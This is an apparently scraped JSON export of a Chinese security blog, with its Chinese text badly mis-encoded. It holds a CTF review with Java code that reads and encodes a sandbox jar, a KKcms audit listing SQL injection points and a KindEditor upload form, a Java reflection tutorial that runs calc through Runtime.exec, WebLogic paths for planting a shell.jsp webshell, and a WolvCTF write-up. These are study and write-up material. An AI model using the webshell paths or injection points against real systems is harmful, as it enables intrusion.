&#123; for (int i = 0; i &lt; fileList.length; i++) &#123; stack.push(fileList[i]); &#125; &#125; &#125; else &#123; java.io.FileInputStream fis = new java.io.FileInputStream(currentFile); String zipEntryName = currentFile.getAbsolutePath().substring(folder.getAbsolutePath().length() + 1); zos.putNextEntry(new java.util.zip.ZipEntry(zipEntryName)); byte[] buffer = new byte[1024]; int length; while ((length = fis.read(buffer)) &gt; 0) &#123; zos.write(buffer, 0, length); &#125; fis.close(); zos.closeEntry(); &#125; &#125; zos.close(); byte[] zipBytes = baos.toByteArray(); StringBuilder hexString = new StringBuilder(); for (int i = 0; i &lt; zipBytes.length; i++) &#123; String hex = Integer.toHexString(0xff &amp; zipBytes[i]); if (hex.length() == 1) hexString.append(&#x27;0&#x27;); hexString.append(hex); &#125; System.out.println(hexString.toString());&#125;catch(Exception e)&#123;System.out.println(e);&#125;*/ 123456789101112131415161718#è¯»å–æ–‡ä»¶try &#123; java.io.File file = new java.io.File(&quot;/home/ctf/sandbox/lib/sandbox-agent.jar&quot;); // éœ€è¦è¯»å–çš„äºŒè¿›åˆ¶æ–‡ä»¶ java.io.BufferedInputStream bis = new java.io.BufferedInputStream(new java.io.FileInputStream(file)); byte[] buffer = new byte[1024]; // åˆ›å»ºä¸€ä¸ªå­—èŠ‚æ•°ç»„ä½œä¸ºç¼“å†²åŒº int bytesRead; while ((bytesRead = bis.read(buffer)) != -1) &#123; // å¾ªç¯è¯»å– // å¤„ç†è¯»å–çš„æ•°æ®ï¼ˆè¿™é‡Œå¯ä»¥è¿›è¡Œæ‰“å°ã€å¤„ç†ç­‰ï¼‰ //System.out.write(buffer, 0, bytesRead); System.out.print(&#x27;&quot;&#x27;); System.out.print(java.util.Base64.getEncoder().encodeToString(buffer)); System.out.println(&quot;\\&quot;,&quot;); &#125; &#125; catch ( java.io.IOException e) &#123; e.printStackTrace(); &#125; å…¶å®æ¯”èµ›çš„æ—¶å€™æƒ³è¿‡ç”¨base64å°†æ–‡ä»¶ç¼–ç è¯»å–ï¼Œä½†æ˜¯å› ä¸ºæ•°æ®è¿‡å¤§å¯¼è‡´ç½‘é¡µå¡æ­»äº†å°±æ²¡æœ‰ç»§ç»­æƒ³è¿‡äº† å”‰ï¼Œè¿˜å¾—ç»§ç»­å­¦ï¼Œå¤ªèœäº†","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"å¤ç›˜","slug":"ctf/å¤ç›˜","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"KKcmsä»£å®¡","slug":"KKcmsä»£å®¡","date":"2024-10-14T17:48:36.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/10/15/KKcmsä»£å®¡/","permalink":"https://lvzhouhang.xyz/2024/10/15/KKcms%E4%BB%A3%E5%AE%A1/","excerpt":"","text":"ç¯å¢ƒå®‰è£…æºç ä¸‹è½½åœ°å€ï¼šhttps://github.com/erichuang2015/kkcms php5.6 .9+mysql5.7.26+apache2.4.39 å®¡è®¡éªŒè¯ç å¤ç”¨ 1&lt;img src=&quot;../system/verifycode.php&quot; onclick=&quot;javascript:this.src=&#x27;../system/verifycode.php?&#x27;+Math.random()&quot; style=&quot;cursor:pointer;&quot; alt=&quot;ç‚¹å‡»æ›´æ¢&quot; title=&quot;ç‚¹å‡»æ›´æ¢&quot; /&gt; è¿™ä¸²ä»£ç ç”¨æ¥æ‰§è¡Œjsä»£ç æ›´æ¢éªŒè¯ç ï¼Œä½†æ˜¯bpå®ƒé»˜è®¤ä¸åŠ è½½jsï¼Œæ‰€ä»¥é€ æˆäº†éªŒè¯ç å¤ç”¨ã€‚ 123456789101112131415161718&lt;?phpsession_start();$image = imagecreate(50, 34);$bcolor = imagecolorallocate($image, 0, 0, 0);$fcolor = imagecolorallocate($image, 255, 255, 255);$str = &#x27;0123456789&#x27;;$rand_str = &#x27;&#x27;;for ($i = 0; $i &lt; 4; $i++)&#123; $k = mt_rand(1, strlen($str)); $rand_str .= $str[$k - 1];&#125;$_SESSION[&#x27;verifycode&#x27;] = $rand_str;imagefill($image, 0, 0, $bcolor);imagestring($image, 7, 7, 10, $rand_str, $fcolor);header(&#x27;content-type:image/png&#x27;);imagepng($image);?&gt; verifycode.phpçš„ä»£ç ï¼Œå°±æ˜¯ç”Ÿæˆä¸€ä¸ªéšæœºçš„4ä½0-9çš„å›¾ç‰‡éªŒè¯ç  æ–‡ä»¶ä¸Šä¼ è¿™ä¸ªcmsé»˜è®¤ç”¨çš„ç¼–è¾‘å™¨æ˜¯KindEditor,ç‰ˆæœ¬æ˜¯4.1.10ï¼Œæ„é€ payload 1&lt;html&gt;&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://127.0.0.1/editor/php/upload_json.php&quot; method=&quot;post&quot;&gt; Upload a new file:&lt;br&gt; &lt;input type=&quot;file&quot; name=&quot;imgFile&quot; size=&quot;50&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt; &lt;/form&gt;&lt;/html&gt; å¯ä»¥ç›´æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ã€‚ è€Œä¸”ä»–æœ‰ç™½åå•ï¼Œåªèƒ½ä¸Šä¼ æŒ‡å®šçš„åç¼€æ–‡ä»¶ã€‚ å‰å°sqlæ³¨å…¥åœ¨template\\wapian\\vlist.phpè¿™é‡Œ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–æ²¡æœ‰ä»»ä½•çš„é˜²æŠ¤ï¼Œä½†å…¶å®æ˜¯æœ‰é˜²æŠ¤çš„,vlist.phpé‡ŒåŒ…å«äº†system/inc.php,è€Œinc.phpä¸­æœ‰ä¸€ä¸ªè½¬ä¹‰çš„å‡½æ•° ä½†æ˜¯è¿™é‡Œä¸ºä»€ä¹ˆå¯ä»¥æ³¨å…¥å‘¢ï¼Ÿæ˜¯å› ä¸ºè¿™é‡Œæ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œæ²¡æœ‰ç”¨åŒå¼•å·åŒ…è£¹ï¼Œè‡ªç„¶ä¹Ÿä¸ç”¨åŒå¼•å·è¿›è¡Œé—­åˆï¼Œaddslashesä¹Ÿå°±æ²¡èµ·ä¸Šä½œç”¨,æ”¾è¿›sqlmapé‡Œå°±å¯ä»¥è·‘å‡ºæ¥ã€‚ å‰å°sqlæ³¨å…¥2åœ¨ucenter\\reg.phpé‡Œ è¿™é‡Œä¸ºä»€ä¹ˆå¯ä»¥æ³¨å…¥å‘¢ï¼Ÿè¿™é‡Œæ˜¯å› ä¸ºä»–æœ‰ä¸€ä¸ªstripslasheså‡½æ•°ï¼Œå®ƒä¼šåˆ é™¤ç”±addslashesæ·»åŠ ä¸Šçš„æ–œæ ï¼Œæ”¾è¿›sqlmapé‡Œè·‘ ä¹Ÿæ˜¯å¯ä»¥è·‘å‡ºæ¥ç›²æ³¨ã€‚æœç´¢stripslasheså…³é”®å­—ï¼Œå¯ä»¥æ‰¾åˆ°repass.phpå’Œactive.phpåŒæ ·æœ‰æ³¨å…¥ã€‚ åå°sqlæ³¨å…¥åœ¨cms_usergroup_edit.phpå¤„ ä¿®æ”¹ä¼šå‘˜çº§åˆ«å¤„æœ‰ç›²æ³¨ï¼Œä½†æ˜¯sqlè·‘ä¸å‡ºæ¥ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ç„¶åå’Œæ­¤å¤„ä¸€æ ·çš„è¿˜æœ‰cms_ad_edit.phpã€cms_admin_edit.phpã€cms_book_edit.phpã€cms_channel_edit.php è¿˜æœ‰ä¸€å¤„ è¿™é‡Œæœ‰deleteæ³¨å…¥ï¼Œæ•´ä¸ªåå°çš„deleteè¯­å¥å…¨æ˜¯è¿™æ ·å†™çš„ã€‚ XSSæ¼æ´å°±ä¸å®¡è®¡äº†ï¼Œè¿™ä¸ªcmså°±è¿™æ ·å§ï¼Œä¸€ä¸ªæ¯”è¾ƒç®€å•çš„cmsã€‚","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://lvzhouhang.xyz/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://lvzhouhang.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"javaåå°„","slug":"javaåå°„","date":"2024-05-31T00:44:30.000Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2024/05/31/javaåå°„/","permalink":"https://lvzhouhang.xyz/2024/05/31/java%E5%8F%8D%E5%B0%84/","excerpt":"","text":"ä»€ä¹ˆæ˜¯åå°„åå°„æ˜¯å¤§å¤šæ•°è¯­è¨€éƒ½å¿…ä¸å¯å°‘çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰â½…æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰ï¼Œæ‹¿åˆ°çš„â½…æ³•å¯ä»¥è°ƒâ½¤ï¼Œæ€»ä¹‹é€šè¿‡â€œåå°„â€ï¼Œæˆ‘ä»¬å¯ä»¥å°† Java è¿™ç§é™æ€è¯­â¾”é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚ Javaåå°„ç»„æˆç›¸å…³çš„ç±»java.lang.Classï¼šç±»å¯¹è±¡; java.lang.reflect.Constructorï¼šç±»çš„æ„é€ å™¨å¯¹è±¡; java.lang.reflect.Fieldï¼šç±»çš„å±æ€§å¯¹è±¡; java.lang.reflect.Methodï¼šç±»çš„æ–¹æ³•å¯¹è±¡; å®ä¾‹åŒ–å¯¹è±¡çš„æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•å¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ objï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ obj.getClass æ¥è·å–å®ƒçš„ç±»ã€‚ ä½¿ç”¨ç±»çš„ .class æ–¹æ³•å¦‚æœä½ å·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„ java.lang.Class å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ‹¿å®ƒçš„ class å±æ€§å³å¯ã€‚è¿™ä¸ªâ½…æ³•å…¶å®ä¸å±äºåå°„ã€‚ Class.forName(String className)ï¼šåŠ¨æ€åŠ è½½ç±»å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿â½¤ forName æ¥è·å–ï¼Œåç»­è¦åˆ©ç”¨çš„è¯æ˜¯éœ€è¦å®ä¾‹åŒ–çš„ã€‚ è·å–æˆå‘˜å˜é‡Fieldè·å–æˆå‘˜å˜é‡Fieldä½äº java.lang.reflect.Field åŒ…ä¸­ Field[] getFields() ï¼šè·å–æ‰€æœ‰ public ä¿®é¥°çš„æˆå‘˜å˜é‡ Field[] getDeclaredFields() è·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦ Field getField(String name) è·å–æŒ‡å®šåç§°çš„ public ä¿®é¥°çš„æˆå‘˜å˜é‡ Field getDeclaredField(String name) è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡ è·å–æˆå‘˜æ–¹æ³• Method123456789Method getMethod(String name, ç±»&lt;?&gt;... parameterTypes) //è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„publicæ–¹æ³•Method getDeclaredMethod(String name, ç±»&lt;?&gt;... parameterTypes) //è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„æ‰€æœ‰æ–¹æ³•//ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¯¥æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°è·å–æ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹Method[] getMethods() //è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•Method[] getDeclaredMethods() // è·å–è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³• è·å–æ„é€ å‡½æ•° Constructor1234567Constructor&lt;?&gt;[] getConstructors() ï¼šåªè¿”å›publicæ„é€ å‡½æ•°Constructor&lt;?&gt;[] getDeclaredConstructors() ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•°Constructor&lt;&gt; getConstructor(ç±»&lt;?&gt;... parameterTypes) : åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„publicæ„é€ å‡½æ•°Constructor&lt;&gt; getDeclaredConstructor(ç±»&lt;?&gt;... parameterTypes) ï¼š åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•° å‘½ä»¤æ‰§è¡Œè·å– class å®ä¾‹ ä¹‹å è·å–ç±»åï¼šforName() åˆ›å»ºå¯¹åº”ç±»å‹çš„å®ä¾‹ï¼šnewInstance() è·å–å­—æ®µçš„å€¼ï¼šget()ã€è®¾ç½®å­—æ®µçš„å€¼ï¼šset() è·å–æ–¹æ³•ï¼šgetMethod()ã€è°ƒç”¨æ–¹æ³•ï¼šinvoke() åŸºæœ¬çŸ¥è¯†å°±æ˜¯è¿™äº›ï¼Œå¦‚ä½•æ‰§è¡Œå‘½ä»¤å‘¢ï¼Œä¸¾ä¸ªä¾‹å­ 123456789101112131415package src;import java.lang.reflect.Field;import java.lang.reflect.Method;public class FinalReflectionCalc &#123; public static void main(String[] args) throws Exception&#123; Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);//åˆ›å»ºä¸€ä¸ªruntimeçš„æ–¹æ³• Method c2 = c1.getDeclaredMethod(&quot;getRuntime&quot;);//è·å–getRuntimeçš„æ–¹æ³• c2.setAccessible(true);//ä½¿getRuntimeå¯è®¿é—®ï¼Œå› ä¸ºgetRuntimeæ˜¯ç§æœ‰å±æ€§ Object o1 = c2.invoke(null);//è°ƒç”¨é™æ€æ–¹æ³•ï¼Œæ— éœ€å®ä¾‹ Method m1 = c1.getDeclaredMethod(&quot;exec&quot;,String.class);//è·å–execæ–¹æ³• m1.invoke(o1,&quot;calc&quot;);//å¼¹è®¡ç®—å™¨ &#125;&#125; è¿™æ˜¯è°ƒç”¨é™æ€æ–¹æ³•ï¼Œä¸éœ€è¦å®ä¾‹ å½“ç„¶ä¹Ÿå¯ä»¥å®ç°ä¸€ä¸ªæ–°å®ä¾‹ 1234567891011121314151617package src;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;public class FinalReflectionCalc &#123; public static void main(String[] args) throws Exception&#123; Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);//è·å–Runtimeçš„Classå¯¹è±¡ Constructor c2=c1.getDeclaredConstructor();//è·å–Runtimeç±»çš„æ— å‚æ„é€ å‡½æ•° c2.setAccessible(true);//ä½¿getRuntimeå¯è®¿é—® Object c3=c2.newInstance();//åˆ›å»ºRuntimeçš„æ–°å®ä¾‹ Method exec = c1.getDeclaredMethod(&quot;exec&quot;, String.class); exec.invoke(c3,&quot;calc&quot;);//å¼¹è®¡ç®—å™¨ &#125;&#125; Javaååºåˆ—åŒ–åŸºç¡€ç¯‡-02-Javaåå°„ä¸URLDNSé“¾åˆ†æå‚è€ƒé“¾æ¥ï¼Œå†™çš„å¾ˆæ¸…æ™° Javaåå°„ Javaåå°„ä¿®æ”¹å­—æ®µprivate123456789101112131415161718package src;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class PrivateReflect &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123; Class c = Class.forName(&quot;src.PrivatePerson&quot;); Object m = c.newInstance(); Method PrintMethod = c.getDeclaredMethod(&quot;printName&quot;); PrintMethod.invoke(m); Field nameField = c.getDeclaredField(&quot;name&quot;); nameField.setAccessible(true); nameField.set(m, new StringBuilder(&quot;aaaaa&quot;)); PrintMethod.invoke(m); &#125;&#125; 123456789package src;public class PrivatePerson &#123; private StringBuilder name = new StringBuilder(&quot;lll&quot;); public void printName() &#123; System.out.println(name); &#125;&#125; staticå•ç‹¬å‡ºç°çš„è¯ï¼Œç”¨getDeclaredFieldä¹Ÿå¯ä»¥ 123456789101112131415161718package src;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class PrivateReflect &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123; Class c = Class.forName(&quot;src.PrivatePerson&quot;); Object m =c.newInstance(); Method f = c.getDeclaredMethod(&quot;printName&quot;); f.invoke(m); Field ff=c.getDeclaredField(&quot;name&quot;); ff.setAccessible(true); ff.set(m,new StringBuilder(&quot;lvzhouhang&quot;)); f.invoke(m); &#125;&#125; finalfinal å­—æ®µèƒ½å¦ä¿®æ”¹ï¼Œæœ‰ä¸”å–å†³äºå­—æ®µæ˜¯ç›´æ¥èµ‹å€¼è¿˜æ˜¯é—´æ¥èµ‹å€¼ï¼ˆç¼–è¯‘æ—¶èµ‹å€¼å’Œè¿è¡Œæ—¶èµ‹å€¼çš„åŒºåˆ«ï¼‰ã€‚ç›´æ¥èµ‹å€¼æ˜¯æŒ‡åœ¨åˆ›å»ºå­—æ®µæ—¶å°±å¯¹å­—æ®µè¿›è¡Œèµ‹å€¼ï¼Œå¹¶ä¸”å€¼ä¸º JAVA çš„ 8 ç§åŸºç¡€æ•°æ®ç±»å‹æˆ–è€… String ç±»å‹ï¼Œè€Œä¸”å€¼ä¸èƒ½æ˜¯ç»è¿‡é€»è¾‘åˆ¤æ–­äº§ç”Ÿçš„ï¼Œå…¶ä»–æƒ…å†µå‡ä¸ºé—´æ¥èµ‹å€¼ã€‚ ç›´æ¥èµ‹å€¼123456789101112package src;public class FinalStraightPerson &#123; private final String name = &quot;lvzhouhang&quot;; public final int age = 21-1; public void printInfo() &#123; System.out.println(name+&quot; &quot;+age); &#125;&#125; 12345678910111213141516171819202122package src;import java.lang.reflect.Field;import java.lang.reflect.Method;public class FinalStraightReflect &#123; public static void main(String[] args) throws Exception &#123; Class c = Class.forName(&quot;src.FinalStraightPerson&quot;); Object m = c.newInstance(); Method printMethod = c.getDeclaredMethod(&quot;printInfo&quot;); printMethod.invoke(m); Field nameField = c.getDeclaredField(&quot;name&quot;); Field ageField = c.getDeclaredField(&quot;age&quot;); nameField.setAccessible(true); ageField.setAccessible(true); nameField.set(m,&quot;lvzhouhang&quot;); ageField.set(m,&quot;20&quot;); printMethod.invoke(m); &#125;&#125; è¿™æ ·é€šè¿‡åå°„ä¿®æ”¹ä¼šæŠ¥é”™ 123456Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Can not set final int field src.FinalStraightPerson.age to java.lang.String at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167) at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171) at sun.reflect.UnsafeQualifiedIntegerFieldAccessorImpl.set(UnsafeQualifiedIntegerFieldAccessorImpl.java:100) at java.lang.reflect.Field.set(Field.java:764) at src.FinalStraightReflect.main(FinalStraightReflect.java:18) ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ å› ä¸ºJVMåœ¨ç¼–è¯‘æ—¶æœŸ, å°±æŠŠfinalç±»å‹çš„Stringè¿›è¡Œäº†ä¼˜åŒ–, åœ¨ç¼–è¯‘æ—¶æœŸå°±ä¼šæŠŠStringå¤„ç†æˆå¸¸é‡ï¼Œåªè¦æ˜¯è®©nameçš„å€¼ç»è¿‡è¿è¡Œæ‰èƒ½è·å¾—, é‚£ä¹ˆå°±ä¸ä¼šè¢«å¤„ç†ä¸ºå¸¸é‡ã€‚ é—´æ¥ä¿®æ”¹123456789101112131415161718192021222324package src;import java.lang.reflect.Field;import java.lang.reflect.Method;public class InDirectReflect &#123; public static void main(String[] args) throws Exception &#123; Class c = Class.forName(&quot;src.InDirectPerson&quot;); Object m = c.newInstance(); Method printMethod = c.getDeclaredMethod(&quot;printInfo&quot;); printMethod.invoke(m); Field nameField = c.getDeclaredField(&quot;name&quot;); Field ageField = c.getDeclaredField(&quot;age&quot;); Field sexField = c.getDeclaredField(&quot;sex&quot;); nameField.setAccessible(true); ageField.setAccessible(true); sexField.setAccessible(true); nameField.set(m,&quot;lvzhouhang&quot;); ageField.set(m,200); sexField.set(m,new StringBuilder(&quot;female&quot;)); printMethod.invoke(m); &#125;&#125; 1234567891011121314151617package src;public class InDirectPerson &#123; private final StringBuilder sex = new StringBuilder(&quot;male&quot;); // ç»è¿‡é€»è¾‘åˆ¤æ–­äº§ç”Ÿçš„å˜é‡èµ‹å€¼ public final int age = (null!=null?20:20); // é€šè¿‡æ„é€ å‡½æ•°è¿›è¡Œèµ‹å€¼ private final String name; public InDirectPerson()&#123; name = &quot;lvzhouhang&quot;; &#125; public void printInfo() &#123; System.out.println(name+&quot; &quot;+age+&quot; &quot;+sex); &#125;&#125; è¿™æ ·å°±ä¿®æ”¹æˆåŠŸäº† static+final12345678910package src;public class finalstaticreflection &#123; private final static StringBuilder name = new StringBuilder(&quot;lvzhouhang&quot;); public void printName() &#123; System.out.println(name); &#125;&#125; 123456789101112131415161718package src;import java.lang.reflect.Field;import java.lang.reflect.Method;public class finalstaticflectioncalc &#123; public static void main(String[] args) throws Exception&#123; finalstaticreflection c = new finalstaticreflection(); Method m = c.getClass().getDeclaredMethod(&quot;printName&quot;); m.invoke(c); Field f = c.getClass().getField(&quot;name&quot;); f.setAccessible(true); f.set(c,new StringBuilder(&quot;lllllvzhouhang&quot;)); m.invoke(c); &#125;&#125; è¿™æ ·ä½¿ä¿®æ”¹ä¸æˆåŠŸçš„ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä¿®æ”¹ï¼Œé€šè¿‡åå°„å°†nameå­—æ®µå–å‡ºæ¥åå°†finalä¿®é¥°ç¬¦å»æ‰å°±å¯ä»¥ä¿®æ”¹ 1234567891011121314151617181920212223242526package src;import com.sun.org.apache.xpath.internal.operations.Mod;import java.io.File;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.lang.reflect.Modifier;public class finalstaticflectioncalc &#123; public static void main(String[] args) throws Exception&#123; finalstaticreflection c = new finalstaticreflection(); Method m = c.getClass().getDeclaredMethod(&quot;printName&quot;); c.printName(); Field f = c.getClass().getDeclaredField(&quot;name&quot;); f.setAccessible(true); Field ff = f.getClass().getDeclaredField(&quot;modifiers&quot;); ff.setAccessible(true); ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);//å»æ‰finalä¿®é¥°ç¬¦ f.set(c,new StringBuilder(&quot;lllllvzhouhang&quot;)); ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);//åŠ ä¸Šfinalä¿®é¥°ç¬¦ c.printName(); &#125;&#125; è¿™æ ·å°±æˆåŠŸä¿®æ”¹äº†","categories":[{"name":"JAVA","slug":"JAVA","permalink":"https://lvzhouhang.xyz/categories/JAVA/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://lvzhouhang.xyz/tags/JAVA/"}]},{"title":"weblogicä¸Šä¼ é©¬è·¯å¾„é€‰æ‹©","slug":"weblogicä¸Šä¼ é©¬è·¯å¾„é€‰æ‹©","date":"2024-04-12T00:23:23.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/04/12/weblogicä¸Šä¼ é©¬è·¯å¾„é€‰æ‹©/","permalink":"https://lvzhouhang.xyz/2024/04/12/weblogic%E4%B8%8A%E4%BC%A0%E9%A9%AC%E8%B7%AF%E5%BE%84%E9%80%89%E6%8B%A9/","excerpt":"","text":"weblogicä¸Šä¼ æœ¨é©¬è·¯å¾„é€‰æ‹©å¯¹äºååºåˆ—åŒ–æ¼æ´ï¼Œå¦‚æœè·å¾—çš„æ˜¯ç³»ç»Ÿæƒé™æˆ–è€…rootæƒé™ï¼Œé‚£å°±æ²¡å¿…è¦ä¸Šä¼ æœ¨é©¬ï¼Œä½†å¦‚æœåªæ˜¯webå®‰è£…åº”ç”¨çš„æƒé™ï¼Œå°±ä¸Šä¼ è·å–æ›´å¤§æƒé™ã€‚ ä¸Šä¼ éœ€è¦æ‰¾åˆ°å‡ ä¸ªç‚¹ï¼Œè·å–ç‰©ç†è·¯å¾„ï¼Œå¦‚ä¸‹é¢ä¸‰ç§ï¼š æ–¹æ³•1ï¼šæŠŠshellå†™åˆ°æ§åˆ¶å°imagesç›®å½•ä¸­\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp ç›®å½•ä¸Šä¼ æœ¨é©¬ï¼Œè®¿é—® http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp æ–¹æ³•2ï¼šå†™åˆ°uddiexplorerç›®å½•ä¸­\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\uddiexplorer\\éšæœºå­—ç¬¦\\war\\shell.jsp ç›®å½•å†™å…¥æœ¨é©¬ï¼Œè®¿é—® http://*.*.*.*:7001/uddiexplorer/shell.jsp æ–¹æ³•3ï¼šåœ¨åº”ç”¨å®‰è£…ç›®å½•ä¸­\\Oracle\\Middleware\\user_projects\\domains\\application\\servers\\AdminServer\\tmp\\_WL_user\\é¡¹ç›®å\\éšæœºå­—ç¬¦\\war\\shell.jsp ç›®å½•å†™å…¥æœ¨é©¬ï¼Œè®¿é—® http://*.*.*.*:7001/é¡¹ç›®å/shell.jsp","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"WolvCTF2024-å¤ç›˜","slug":"WolvCTF2024-å¤ç›˜","date":"2024-03-18T09:40:20.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/03/18/WolvCTF2024-å¤ç›˜/","permalink":"https://lvzhouhang.xyz/2024/03/18/WolvCTF2024-%E5%A4%8D%E7%9B%98/","excerpt":"","text":"Bean Cafeä»–çš„éªŒè¯é€»è¾‘æ˜¯é€šè¿‡å›¾ç‰‡çš„md5çš„å€¼æ¥éªŒè¯çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ ä¸¤å¼ MD5ç›¸åŒçš„å›¾ç‰‡å°±å¯ä»¥è·å¾—flag https://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0 Upload Fun123456789101112131415161718192021222324252627282930313233343536373839&lt;?php if($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;)&#123; if ($_FILES[&quot;f&quot;][&quot;size&quot;] &gt; 1000) &#123; echo &quot;file too large&quot;; return; &#125; if (str_contains($_FILES[&quot;f&quot;][&quot;name&quot;], &quot;..&quot;)) &#123; echo &quot;no .. in filename please&quot;; return; &#125; if (empty($_FILES[&quot;f&quot;]))&#123; echo &quot;empty file&quot;; return; &#125; $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; $flag = file_get_contents(&quot;/flag.txt&quot;); $hash = hash(&#x27;sha256&#x27;, $flag . $ip); if (move_uploaded_file($_FILES[&quot;f&quot;][&quot;tmp_name&quot;], &quot;./uploads/&quot; . $hash . &quot;_&quot; . $_FILES[&quot;f&quot;][&quot;name&quot;])) &#123; echo &quot;upload success&quot;; &#125; else &#123; echo &quot;upload error&quot;; &#125; &#125; else &#123; if (isset($_GET[&quot;f&quot;])) &#123; $path = &quot;./uploads/&quot; . $_GET[&quot;f&quot;]; if (str_contains($path, &quot;..&quot;)) &#123; echo &quot;no .. in f please&quot;; return; &#125; include $path; &#125; highlight_file(&quot;index.php&quot;); &#125;?&gt; é¦–å…ˆåˆ†æä¸€ä¸‹æºç ï¼Œæºç é€šè¿‡POSTæ–¹å¼æ¥ä¸Šä¼ æ–‡ä»¶å¹¶ä¸”ä¸Šä¼ çš„æ–‡ä»¶ä¸èƒ½åŒ…å«..ç”¨GETçš„æ–¹å¼æ¥è¯»å–æ–‡ä»¶ä¹Ÿä¸èƒ½å¸¦æœ‰..ï¼Œä¸Šä¼ çš„æ–‡ä»¶åœ¨uploadsç›®å½•ä¸‹ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“$hashæ˜¯ä»€ä¹ˆã€‚ 